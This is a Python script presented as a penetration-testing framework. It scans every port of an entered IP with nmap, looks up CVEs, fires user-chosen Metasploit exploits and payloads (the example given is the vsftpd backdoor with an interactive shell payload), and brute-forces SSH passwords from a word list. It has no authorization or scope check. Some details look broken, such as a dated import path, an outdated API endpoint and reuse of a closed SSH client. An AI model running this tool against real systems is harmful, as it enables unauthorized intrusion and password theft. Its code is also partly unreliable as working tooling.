import nmap
import requests
import paramiko
import json
from metasploit.msfrpc import MsfRpcClient
from typing import List, Optional, Dict

# Configuration for Metasploit and Vulnerability API
MSF_PASSWORD = 'your_metasploit_password'
VULN_API_URL = "https://services.nvd.nist.gov/rest/json/cves/1.0"

class PenTestFramework:
    def __init__(self, target_ip: str):
        self.target_ip = target_ip
        self.msf_client = self._initialize_msf_client()
        self.scan_results = []
        self.vulnerabilities = []
        self.exploit_attempts = []
        self.successful_credentials = None

    @staticmethod
    def _initialize_msf_client() -> Optional[MsfRpcClient]:
        """Initialize Metasploit RPC client."""
        try:
            client = MsfRpcClient(MSF_PASSWORD)
            print("[INFO] Connected to Metasploit RPC.")
            return client
        except Exception as error:
            print(f"[ERROR] Metasploit connection failed: {error}")
            return None

    def network_scan(self):
        """Conduct a network scan on the target IP."""
        scanner = nmap.PortScanner()
        try:
            scanner.scan(self.target_ip, '1-65535')
            for host in scanner.all_hosts():
                host_info = {"host": host, "protocols": []}
                for proto in scanner[host].all_protocols():
                    protocol_info = {"protocol": proto, "ports": []}
                    for port, port_data in scanner[host][proto].items():
                        protocol_info["ports"].append({
                            "port": port,
                            "state": port_data['state'],
                            "service": port_data.get('name', ''),
                            "version": port_data.get('version', '')
                        })
                    host_info["protocols"].append(protocol_info)
                self.scan_results.append(host_info)
            print("[INFO] Network scan completed.")
        except Exception as error:
            print(f"[ERROR] Network scan failed: {error}")

    @staticmethod
    def fetch_vulnerabilities(service_name: str, version: str) -> List[Dict[str, str]]:
        """Fetch CVE vulnerabilities for a given service and version."""
        try:
            response = requests.get(f"{VULN_API_URL}?keyword={service_name}+{version}")
            if response.status_code == 200:
                vulns = response.json().get('result', {}).get('CVE_Items', [])
                return [
                    {"CVE ID": vuln['cve']['CVE_data_meta']['ID'],
                     "Description": vuln['cve']['description']['description_data'][0]['value']}
                    for vuln in vulns
                ]
        except Exception as error:
            print(f"[ERROR] Failed to fetch vulnerabilities: {error}")
        return []

    def vulnerability_assessment(self):
        """Assess vulnerabilities for identified services in the scan results."""
        for host in self.scan_results:
            for proto in host["protocols"]:
                for port in proto["ports"]:
                    if port["service"]:
                        vulns = self.fetch_vulnerabilities(port["service"], port["version"])
                        self.vulnerabilities.extend(vulns)
        print("[INFO] Vulnerability assessment completed.")

    def exploit_service(self, exploit_name: str, payload: str):
        """Attempt exploitation using Metasploit."""
        if not self.msf_client:
            print("[WARNING] Metasploit client not initialized.")
            return

        try:
            exploit = self.msf_client.modules.use('exploit', exploit_name)
            exploit['RHOST'] = self.target_ip
            exploit.execute(payload=payload)
            self.exploit_attempts.append({"exploit": exploit_name, "payload": payload})
            print("[INFO] Exploit attempt executed.")
        except Exception as error:
            print(f"[ERROR] Exploitation attempt failed: {error}")

    @staticmethod
    def ssh_brute_force(ip: str, username: str, password_list: List[str]) -> Optional[Dict[str, str]]:
        """Perform SSH brute force with a list of passwords."""
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        for password in password_list:
            try:
                client.connect(ip, username=username, password=password)
                print(f"[SUCCESS] Valid credentials - Username: {username}, Password: {password}")
                return {"username": username, "password": password}
            except paramiko.AuthenticationException:
                print(f"[FAILED] Invalid password: {password}")
            finally:
                client.close()
        return None

    def generate_report(self, filename: str = "pentest_report.json"):
        """Generate JSON report of the penetration test results."""
        report_data = {
            "network_scan": self.scan_results,
            "vulnerabilities": self.vulnerabilities,
            "exploits_attempted": self.exploit_attempts,
            "successful_credentials": self.successful_credentials
        }
        with open(filename, 'w') as report_file:
            json.dump(report_data, report_file, indent=4)
        print(f"[INFO] Report generated: {filename}")

def main():
    # Initialize framework with target
    target_ip = input("Enter target IP: ")
    pentest = PenTestFramework(target_ip=target_ip)

    # Network Scanning
    pentest.network_scan()

    # Vulnerability Assessment
    pentest.vulnerability_assessment()

    # Exploitation Attempts (optional)
    exploit_prompt = input("Do you want to attempt exploitation? (yes/no): ")
    if exploit_prompt.lower() == 'yes':
        exploit_name = input("Enter Metasploit exploit module name (e.g., 'exploit/unix/ftp/vsftpd_234_backdoor'): ")
        payload = input("Enter payload (e.g., 'cmd/unix/interact'): ")
        pentest.exploit_service(exploit_name, payload)

    # SSH Brute Force (optional)
    brute_force_prompt = input("Do you want to perform SSH brute force? (yes/no): ")
    if brute_force_prompt.lower() == 'yes':
        username = input("Enter SSH username: ")
        password_file = input("Enter path to password file: ")
        with open(password_file, 'r') as file:
            passwords = file.read().splitlines()
        pentest.successful_credentials = pentest.ssh_brute_force(target_ip, username, passwords)

    # Generate Report
    pentest.generate_report()

if __name__ == '__main__':
    main()
